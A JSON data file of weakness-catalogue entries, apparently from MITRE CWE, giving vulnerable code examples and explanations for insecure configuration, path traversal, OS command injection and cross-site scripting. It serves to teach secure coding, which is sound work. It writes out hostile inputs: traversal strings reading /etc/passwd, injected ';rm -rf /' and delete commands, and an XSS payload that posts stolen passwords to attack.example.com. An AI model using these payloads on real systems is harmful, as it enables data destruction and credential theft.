[
    {
        "id": 5,
        "demonstrative_examples": ""
    },
    {
        "id": 6,
        "demonstrative_examples": "Example 1 The following XML example code is a deployment descriptor for a Java web application deployed on a Sun Java Application Server. This deployment descriptor includes a session configuration property for configuring the session ID length. (bad code) Example Language: XML <sun-web-app> ... <session-config> <session-properties> <property name=\"idLengthBytes\" value=\"8\"> \"<description>The number of bytes in this web module's session ID.</description>\" </property> </session-properties> </session-config> ... </sun-web-app> \"This deployment descriptor has set the session ID length for this Java web application to 8 bytes (or 64 bits). The session ID length for Java web applications should be set to 16 bytes (128 bits) to prevent attackers from guessing and/or stealing a session ID and taking over a user's session.\" Note for most application servers including the Sun Java Application Server the session ID length is by default set to 128 bits and should not be changed. And for many application servers the session ID length cannot be changed from this default setting. Check your application server documentation for the session ID length default setting and configuration options to ensure that the session ID length is set to 128 bits."
    },
    {
        "id": 7,
        "demonstrative_examples": "Example 1 In the snippet below, an unchecked runtime exception thrown from within the try block may cause the container to display its default error page (which may contain a full stack trace, among other things). (bad code) Example Language: Java Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try { ... } catch (ApplicationSpecificException ase) { logger.error(\"Caught: \" + ase.toString()); } }"
    },
    {
        "id": 8,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: XML <ejb-jar> <enterprise-beans> <entity> <ejb-name>EmployeeRecord</ejb-name> <home>com.wombat.empl.EmployeeRecordHome</home> <remote>com.wombat.empl.EmployeeRecord</remote> ... </entity> ... </enterprise-beans> </ejb-jar>"
    },
    {
        "id": 9,
        "demonstrative_examples": "Example 1 \"The following deployment descriptor grants ANYONE permission to invoke the Employee EJB's method named getSalary().\" (bad code) Example Language: XML <ejb-jar> ... <assembly-descriptor> <method-permission> <role-name>ANYONE</role-name> <method> <ejb-name>Employee</ejb-name> <method-name>getSalary</method-name> </method-permission> </assembly-descriptor> ... </ejb-jar>"
    },
    {
        "id": 11,
        "demonstrative_examples": "Example 1 The file web.config contains the debug mode setting. Setting debug to \"true\" will let the browser display debugging information. (bad code) Example Language: XML <?xml version=\"1.0\" encoding=\"utf-8\" ?> <configuration> <system.web> <compilation defaultLanguage=\"c#\" debug=\"true\" /> ... </system.web> </configuration> Change the debug mode to false when the application is deployed into production."
    },
    {
        "id": 12,
        "demonstrative_examples": "Example 1 The mode attribute of the <customErrors> tag in the Web.config file defines whether custom or default error pages are used. In the following insecure ASP.NET application setting, custom error message mode is turned off. An ASP.NET error message with detailed stack trace and platform versions will be returned. (bad code) Example Language: ASP.NET <customErrors mode=\"Off\" /> A more secure setting is to set the custom error message mode for remote users only. No defaultRedirect error page is specified. The local user on the web server will see a detailed stack trace. For remote users, an ASP.NET error message with the server customError configuration setting and the platform version will be returned. (good code) Example Language: ASP.NET <customErrors mode=\"RemoteOnly\" /> Another secure option is to set the mode attribute of the <customErrors> tag to use a custom page as follows: (good code) Example Language: ASP.NET <customErrors mode=\"On\" defaultRedirect=\"YourErrorPage.htm\" />"
    },
    {
        "id": 13,
        "demonstrative_examples": "Example 1 The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database, but the pair is stored in plaintext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 14,
        "demonstrative_examples": "Example 1 The following code reads a password from the user, uses the password to connect to a back-end mainframe and then attempts to scrub the password from memory using memset(). (bad code) Example Language: C void GetData(char *MFAddr) { char pwd[64]; if (GetPasswordFromUser(pwd, sizeof(pwd))) { if (ConnectToMainframe(MFAddr, pwd)) { // Interaction with mainframe } } memset(pwd, 0, sizeof(pwd)); } The code in the example will behave correctly if it is executed verbatim, but if the code is compiled using an optimizing compiler, such as Microsoft Visual C++ .NET or GCC 3.x, then the call to memset() will be removed as a dead store because the buffer pwd is not used after its value is overwritten [18]. Because the buffer pwd contains a sensitive value, the application may be vulnerable to attack if the data are left memory resident. If attackers are able to access the correct region of memory, they may use the recovered password to gain control of the system. It is common practice to overwrite sensitive data manipulated in memory, such as passwords or cryptographic keys, in order to prevent attackers from learning system secrets. However, with the advent of optimizing compilers, programs do not always behave as their source code alone would suggest. In the example, the compiler interprets the call to memset() as dead code because the memory being written to is not subsequently used, despite the fact that there is clearly a security motivation for the operation to occur. The problem here is that many compilers, and in fact many programming languages, do not take this and other security concerns into consideration in their efforts to improve efficiency. Attackers typically exploit this type of vulnerability by using a core dump or runtime mechanism to access the memory used by a particular application and recover the secret information. Once an attacker has access to the secret information, it is relatively straightforward to further exploit the system and possibly compromise other resources with which the application interacts."
    },
    {
        "id": 15,
        "demonstrative_examples": "Example 1 The following C code accepts a number as one of its command line parameters and sets it as the host ID of the current machine. (bad code) Example Language: C ... sethostid(argv[1]); ... Although a process must be privileged to successfully invoke sethostid(), unprivileged users may be able to invoke the program. The code in this example allows user input to directly control the value of a system setting. If an attacker provides a malicious value for host ID, the attacker can misidentify the affected machine on the network or cause other unintended behavior. Example 2 The following Java code snippet reads a string from an HttpServletRequest and sets it as the active catalog for a database Connection. (bad code) Example Language: Java ... conn.setCatalog(request.getParameter(\"catalog\")); ... In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database."
    },
    {
        "id": 20,
        "demonstrative_examples": "Example 1 This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated. (bad code) Example Language: Java ... public static final double price = 20.00; int quantity = currentUser.getAttribute(\"quantity\"); double total = price * quantity; chargeUser(total); ... The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited. Example 2 This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares. (bad code) Example Language: C ... #define MAX_DIM 100 ... /* board dimensions */ int m,n, error; board_square_t *board; printf(\"Please specify the board height: \\\\n\"); error = scanf(\"%d\", &m); if ( EOF == error ){ die(\"No integer passed: Die evil hacker!\\\\n\"); } printf(\"Please specify the board width: \\\\n\"); error = scanf(\"%d\", &n); if ( EOF == error ){ die(\"No integer passed: Die evil hacker!\\\\n\"); } if ( m > MAX_DIM || n > MAX_DIM ) { die(\"Value too large: Die evil hacker!\\\\n\"); } board = (board_square_t*) malloc( m * n * sizeof(board_square_t)); ... While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption ( CWE-400 ) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation ( CWE-789 ) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow ( CWE-190 ) and unexpected behavior will follow depending on how the values are treated in the remainder of the program. Example 3 \"The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.\" (bad code) Example Language: PHP \"$birthday = $_GET['birthday'];\" \"$homepage = $_GET['homepage'];\" echo \"Birthday: $birthday<br>Homepage: <a href=$homepage>click here</a>\" \"The programmer intended for $birthday to be in a date format and $homepage to be a valid URL. However, since the values are derived from an HTTP request, if an attacker can trick a victim into clicking a crafted URL with <script> tags providing the values for birthday and / or homepage, then the script will run on the client's browser when the web server echoes the content. Notice that even if the programmer were to defend the $birthday variable by restricting input to integers and dashes, it would still be possible for an attacker to provide a string of the form:\" (attack code) 2009-01-09-- If this data were used in a SQL statement, it would treat the remainder of the statement as a comment. The comment could disable other security-related logic in the statement. In this case, encoding combined with input validation would be a more useful protection mechanism. Furthermore, an XSS ( CWE-79 ) attack or SQL injection ( CWE-89 ) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection ( CWE-93 ), Argument Injection ( CWE-88 ), or Command Injection ( CWE-77 ) may also be possible. Example 4 The following example takes a user-supplied value to allocate an array of objects and then operates on the array. (bad code) Example Language: Java private void buildList ( int untrustedListSize ){ if ( 0 > untrustedListSize ){ die(\"Negative value supplied for list size, die evil hacker!\"); } Widget[] list = new Widget [ untrustedListSize ]; list[0] = new Widget(); } This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown. Example 5 This Android application has registered to handle a URL when sent an intent: (bad code) Example Language: Java ... IntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); ... public class UrlHandlerReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if(\"com.example.URLHandler.openURL\".equals(intent.getAction())) { String URL = intent.getStringExtra(\"URLToOpen\"); int length = URL.length(); ... } } } The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called."
    },
    {
        "id": 22,
        "demonstrative_examples": "Example 1 \"The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.\" (bad code) Example Language: Perl my $dataPath = \"/users/cwe/profiles\"; my $username = param(\"user\"); my $profilePath = $dataPath . \"/\" . $username; open(my $fh, \"<$profilePath\") || ExitError(\"profile read error: $profilePath\"); print \"<ul>\\\\n\"; while (<$fh>) { print \"<li>$_</li>\\\\n\"; } print \"</ul>\\\\n\"; While the programmer intends to access files such as \"/users/cwe/profiles/alice\" or \"/users/cwe/profiles/bob\", there is no verification of the incoming user parameter. An attacker could provide a string such as: (attack code) ../../../etc/passwd The program would generate a profile pathname like this: (result) /users/cwe/profiles/../../../etc/passwd When the file is opened, the operating system resolves the \"../\" during path canonicalization and actually accesses this file: (result) /etc/passwd As a result, the attacker could read the entire text of the password file. Notice how this code also contains an error message information leak ( CWE-209 ) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem ( CWE-79 ) if profile contains any HTML, but other code would need to be examined. Example 2 In the example below, the path to a dictionary file is read from a system property and used to initialize a File object. (bad code) Example Language: Java String filename = System.getProperty(\"com.domain.application.dictionaryFile\"); File dictionaryFile = new File(filename); However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or user home directory. Example 3 The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); $Username =~ s/\\\\.\\\\.\\\\///; my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" stripped, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-23 ). Example 4 The following code attempts to validate a given input path by checking it against an allowlist and once validated delete the given file. In this specific case, the path is considered valid if it starts with the string \"/safe_dir/\". (bad code) Example Language: Java String path = getInputPath(); if (path.startsWith(\"/safe_dir/\")) { File f = new File(path); f.delete() } An attacker could provide an input such as this: (attack code) /safe_dir/../important.dat The software assumes that the path is valid because it starts with the \"/safe_path/\" sequence, but the \"../\" sequence will cause the program to delete the important.dat file in the parent directory Example 5 The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet. (good code) Example Language: HTML <form action=\"FileUploadServlet\" method=\"post\" enctype=\"multipart/form-data\"> Choose a file to upload: <input type=\"file\" name=\"filename\"/> <br/> <input type=\"submit\" name=\"submit\" value=\"Submit\"/> </form> \"When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.\" (bad code) Example Language: Java public class FileUploadServlet extends HttpServlet { ... protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); String contentType = request.getContentType(); // the starting position of the boundary header int ind = contentType.indexOf(\"boundary=\"); String boundary = contentType.substring(ind+9); String pLine = new String(); String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value // verify that content type is multipart form data if (contentType != null && contentType.indexOf(\"multipart/form-data\") != -1) { // extract the filename from the Http header BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream())); ... pLine = br.readLine(); String filename = pLine.substring(pLine.lastIndexOf(\"\\\\\\\\\"), pLine.lastIndexOf(\"\\\\\"\")); ... // output the file to the local upload directory try { BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true)); for (String line; (line=br.readLine())!=null; ) { if (line.indexOf(boundary) == -1) { bw.write(line); bw.newLine(); bw.flush(); } } //end of for loop bw.close(); } catch (IOException ex) {...} // output successful upload response HTML page } // output unsuccessful upload response HTML page else {...} } ... } This code does not perform a check on the type of the file being uploaded ( CWE-434 ). This could allow an attacker to upload any executable file or other file with malicious code. Additionally, the creation of the BufferedWriter object is subject to relative path traversal ( CWE-23 ). Since the code does not check the filename that is provided in the header, an attacker can use \"../\" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS ( CWE-79 ), or system crash."
    },
    {
        "id": 23,
        "demonstrative_examples": "Example 1 The following URLs are vulnerable to this attack: (bad code) http://example.com.br/get-files.jsp?file=report.pdf http://example.com.br/get-page.php?home=aaa.html http://example.com.br/some-page.asp?page=index.html A simple way to execute this attack is like this: (attack code) http://example.com.br/get-files?file=../../../../somedir/somefile http://example.com.br/../../../../etc/shadow http://example.com.br/get-files?file=../../../../etc/passwd Example 2 \"The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.\" (bad code) Example Language: Perl my $dataPath = \"/users/cwe/profiles\"; my $username = param(\"user\"); my $profilePath = $dataPath . \"/\" . $username; open(my $fh, \"<$profilePath\") || ExitError(\"profile read error: $profilePath\"); print \"<ul>\\\\n\"; while (<$fh>) { print \"<li>$_</li>\\\\n\"; } print \"</ul>\\\\n\"; While the programmer intends to access files such as \"/users/cwe/profiles/alice\" or \"/users/cwe/profiles/bob\", there is no verification of the incoming user parameter. An attacker could provide a string such as: (attack code) ../../../etc/passwd The program would generate a profile pathname like this: (result) /users/cwe/profiles/../../../etc/passwd When the file is opened, the operating system resolves the \"../\" during path canonicalization and actually accesses this file: (result) /etc/passwd As a result, the attacker could read the entire text of the password file. Notice how this code also contains an error message information leak ( CWE-209 ) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem ( CWE-79 ) if profile contains any HTML, but other code would need to be examined. Example 3 The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet. (good code) Example Language: HTML <form action=\"FileUploadServlet\" method=\"post\" enctype=\"multipart/form-data\"> Choose a file to upload: <input type=\"file\" name=\"filename\"/> <br/> <input type=\"submit\" name=\"submit\" value=\"Submit\"/> </form> \"When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.\" (bad code) Example Language: Java public class FileUploadServlet extends HttpServlet { ... protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); String contentType = request.getContentType(); // the starting position of the boundary header int ind = contentType.indexOf(\"boundary=\"); String boundary = contentType.substring(ind+9); String pLine = new String(); String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value // verify that content type is multipart form data if (contentType != null && contentType.indexOf(\"multipart/form-data\") != -1) { // extract the filename from the Http header BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream())); ... pLine = br.readLine(); String filename = pLine.substring(pLine.lastIndexOf(\"\\\\\\\\\"), pLine.lastIndexOf(\"\\\\\"\")); ... // output the file to the local upload directory try { BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true)); for (String line; (line=br.readLine())!=null; ) { if (line.indexOf(boundary) == -1) { bw.write(line); bw.newLine(); bw.flush(); } } //end of for loop bw.close(); } catch (IOException ex) {...} // output successful upload response HTML page } // output unsuccessful upload response HTML page else {...} } ... } This code does not perform a check on the type of the file being uploaded ( CWE-434 ). This could allow an attacker to upload any executable file or other file with malicious code. Additionally, the creation of the BufferedWriter object is subject to relative path traversal ( CWE-23 ). Since the code does not check the filename that is provided in the header, an attacker can use \"../\" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS ( CWE-79 ), or system crash."
    },
    {
        "id": 24,
        "demonstrative_examples": ""
    },
    {
        "id": 25,
        "demonstrative_examples": ""
    },
    {
        "id": 26,
        "demonstrative_examples": ""
    },
    {
        "id": 27,
        "demonstrative_examples": ""
    },
    {
        "id": 28,
        "demonstrative_examples": ""
    },
    {
        "id": 29,
        "demonstrative_examples": ""
    },
    {
        "id": 30,
        "demonstrative_examples": ""
    },
    {
        "id": 31,
        "demonstrative_examples": ""
    },
    {
        "id": 32,
        "demonstrative_examples": ""
    },
    {
        "id": 33,
        "demonstrative_examples": ""
    },
    {
        "id": 34,
        "demonstrative_examples": ""
    },
    {
        "id": 35,
        "demonstrative_examples": ""
    },
    {
        "id": 36,
        "demonstrative_examples": "Example 1 In the example below, the path to a dictionary file is read from a system property and used to initialize a File object. (bad code) Example Language: Java String filename = System.getProperty(\"com.domain.application.dictionaryFile\"); File dictionaryFile = new File(filename); However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or user home directory."
    },
    {
        "id": 37,
        "demonstrative_examples": ""
    },
    {
        "id": 38,
        "demonstrative_examples": ""
    },
    {
        "id": 39,
        "demonstrative_examples": ""
    },
    {
        "id": 40,
        "demonstrative_examples": ""
    },
    {
        "id": 41,
        "demonstrative_examples": ""
    },
    {
        "id": 42,
        "demonstrative_examples": ""
    },
    {
        "id": 43,
        "demonstrative_examples": ""
    },
    {
        "id": 44,
        "demonstrative_examples": ""
    },
    {
        "id": 45,
        "demonstrative_examples": ""
    },
    {
        "id": 46,
        "demonstrative_examples": ""
    },
    {
        "id": 47,
        "demonstrative_examples": ""
    },
    {
        "id": 48,
        "demonstrative_examples": ""
    },
    {
        "id": 49,
        "demonstrative_examples": ""
    },
    {
        "id": 50,
        "demonstrative_examples": ""
    },
    {
        "id": 51,
        "demonstrative_examples": ""
    },
    {
        "id": 52,
        "demonstrative_examples": ""
    },
    {
        "id": 53,
        "demonstrative_examples": ""
    },
    {
        "id": 54,
        "demonstrative_examples": ""
    },
    {
        "id": 55,
        "demonstrative_examples": ""
    },
    {
        "id": 56,
        "demonstrative_examples": ""
    },
    {
        "id": 57,
        "demonstrative_examples": ""
    },
    {
        "id": 58,
        "demonstrative_examples": ""
    },
    {
        "id": 59,
        "demonstrative_examples": ""
    },
    {
        "id": 61,
        "demonstrative_examples": ""
    },
    {
        "id": 62,
        "demonstrative_examples": ""
    },
    {
        "id": 64,
        "demonstrative_examples": ""
    },
    {
        "id": 65,
        "demonstrative_examples": ""
    },
    {
        "id": 66,
        "demonstrative_examples": ""
    },
    {
        "id": 67,
        "demonstrative_examples": ""
    },
    {
        "id": 69,
        "demonstrative_examples": ""
    },
    {
        "id": 72,
        "demonstrative_examples": "Example 1 A web server that interprets FILE.cgi as processing instructions could disclose the source code for FILE.cgi by requesting FILE.cgi/..namedfork/data. This might occur because the web server invokes the default handler which may return the contents of the file."
    },
    {
        "id": 73,
        "demonstrative_examples": "Example 1 The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files ( CWE-22 ). (bad code) Example Language: Java String rName = request.getParameter(\"reportName\"); File rFile = new File(\"/usr/local/apfr/reports/\" + rName); ... rFile.delete(); Example 2 The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt. (bad code) Example Language: Java fis = new FileInputStream(cfg.getProperty(\"sub\")+\".txt\"); amt = fis.read(arr); out.println(arr);"
    },
    {
        "id": 74,
        "demonstrative_examples": ""
    },
    {
        "id": 75,
        "demonstrative_examples": ""
    },
    {
        "id": 76,
        "demonstrative_examples": ""
    },
    {
        "id": 77,
        "demonstrative_examples": "Example 1 The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system. (bad code) Example Language: C int main(int argc, char** argv) { char cmd[CMD_MAX] = \"/usr/bin/cat \"; strcat(cmd, argv[1]); system(cmd); } Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form \";rm -rf /\", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition. Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow ( CWE-120 ). Example 2 The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user. (bad code) Example Language: Java ... String btype = request.getParameter(\"backuptype\"); String cmd = new String(\"cmd.exe /K \\\\\" c:\\\\\\\\util\\\\\\\\rmanDB.bat \" +btype+ \"&&c:\\\\\\\\utl\\\\\\\\cleanup.bat\\\\\"\") System.Runtime.getRuntime().exec(cmd); ... The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form \"& del c:\\\\\\\\dbms\\\\\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well. Example 3 The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory. (bad code) Example Language: Java ... String home = System.getProperty(\"APPHOME\"); String cmd = home + INITCMD; java.lang.Runtime.getRuntime().exec(cmd); ... The code above allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system. Example 4 The following code is a wrapper around the UNIX command cat which prints the contents of a file to standard out. It is also injectable: (bad code) Example Language: C #include <stdio.h> #include <unistd.h> int main(int argc, char **argv) { char cat[] = \"cat \"; char *command; size_t commandLength; commandLength = strlen(cat) + strlen(argv[1]) + 1; command = (char *) malloc(commandLength); strncpy(command, cat, commandLength); strncat(command, argv[1], (commandLength - strlen(cat)) ); system(command); return (0); } Used normally, the output is simply the contents of the file requested: (informative) $ ./catWrapper Story.txt When last we left our heroes... However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint: (attack code) $ ./catWrapper Story.txt; ls When last we left our heroes... Story.txt SensitiveFile.txt PrivateData.db a.out* If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege."
    },
    {
        "id": 78,
        "demonstrative_examples": "Example 1 \"This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.\" (bad code) Example Language: PHP $userName = $_POST[\"user\"]; \"$command = 'ls -l /home/' . $userName;\" system($command); The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as: (attack code) ;rm -rf / Which would result in $command being: (result) ls -l /home/;rm -rf / Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system. Also note that this example code is vulnerable to Path Traversal ( CWE-22 ) and Untrusted Search Path ( CWE-426 ) attacks. Example 2 This example is a web application that intends to perform a DNS lookup of a user-supplied domain name. It is subject to the first variant of OS command injection. (bad code) Example Language: Perl use CGI qw(:standard); \"$name = param('name');\" $nslookup = \"/path/to/nslookup\"; print header; if (open($fh, \"$nslookup $name|\")) { while (<$fh>) { print escapeHTML($_); print \"<br>\\\\n\"; } close($fh); } Suppose an attacker provides a domain name like this: (attack code) cwe.mitre.org%20%3B%20/bin/ls%20-l The \"%3B\" sequence decodes to the \";\" character, and the %20 decodes to a space. The open() statement would then process a string like this: (result) /path/to/nslookup cwe.mitre.org ; /bin/ls -l As a result, the attacker executes the \"/bin/ls -l\" command and gets a list of all the files in the program\\'s working directory. The input could be replaced with much more dangerous commands, such as installing a malicious program on the server. Example 3 The example below reads the name of a shell script to execute from the system properties. It is subject to the second variant of OS command injection. (bad code) Example Language: Java String script = System.getProperty(\"SCRIPTNAME\"); if (script != null) System.exec(script); If an attacker has control over this property, then they could modify the property to point to a dangerous program. Example 4 In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a user through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates. (bad code) Example Language: Java public String coordinateTransformLatLonToUTM(String coordinates) { String utmCoords = null; try { String latlonCoords = coordinates; Runtime rt = Runtime.getRuntime(); Process exec = rt.exec(\"cmd.exe /C latlon2utm.exe -\" + latlonCoords); // process results of coordinate transform // ... } catch(Exception e) {...} return utmCoords; } \"However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious user could execute another program local to the application server by appending '&' followed by the command for another program to the end of the coordinate string. The '&' instructs the Windows operating system to execute another program.\" Example 5 The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user. (bad code) Example Language: Java ... String btype = request.getParameter(\"backuptype\"); String cmd = new String(\"cmd.exe /K \\\\\" c:\\\\\\\\util\\\\\\\\rmanDB.bat \" +btype+ \"&&c:\\\\\\\\utl\\\\\\\\cleanup.bat\\\\\"\") System.Runtime.getRuntime().exec(cmd); ... The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form \"& del c:\\\\\\\\dbms\\\\\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well."
    },
    {
        "id": 79,
        "demonstrative_examples": "Example 1 This code displays a welcome message on a web page based on the HTTP GET username parameter. This example covers a Reflected XSS (Type 1) scenario. (bad code) Example Language: PHP \"$username = $_GET['username'];\" echo \\'<div class=\"header\"> Welcome, \\' . $username . \\'</div>\\'; Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as (attack code) http://trustedSite.example.com/welcome.php?username=<Script Language=\"Javascript\">alert(\"You\\'ve been attacked!\");</Script> This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. \"More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:\" (attack code) http://trustedSite.example.com/welcome.php?username=<div id=\"stealPassword\">Please Login:<form name=\"input\" action=\"http://attack.example.com/stealPassword.php\" method=\"post\">Username: <input type=\"text\" name=\"username\" /><br/>Password: <input type=\"password\" name=\"password\" /><br/><input type=\"submit\" value=\"Login\" /></form></div> \"If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:\" (result) <div class=\"header\"> Welcome, <div id=\"stealPassword\"> Please Login: <form name=\"input\" action=\"attack.example.com/stealPassword.php\" method=\"post\"> Username: <input type=\"text\" name=\"username\" /><br/> Password: <input type=\"password\" name=\"password\" /><br/> <input type=\"submit\" value=\"Login\" /> </form> </div></div> The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability): (attack code) trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22 stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input %22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php %22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text %22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A +%3Cinput+type%3D%22password%22+name%3D%22password%22 +%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22 +%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A The same attack string could also be obfuscated as: (attack code) trustedSite.example.com/welcome.php?username=<script+type=\"text/javascript\"> \"document.write('\\\\u003C\\\\u0064\\\\u0069\\\\u0076\\\\u0020\\\\u0069\\\\u0064\\\\u003D\\\\u0022\\\\u0073\" \\\\u0074\\\\u0065\\\\u0061\\\\u006C\\\\u0050\\\\u0061\\\\u0073\\\\u0073\\\\u0077\\\\u006F\\\\u0072\\\\u0064 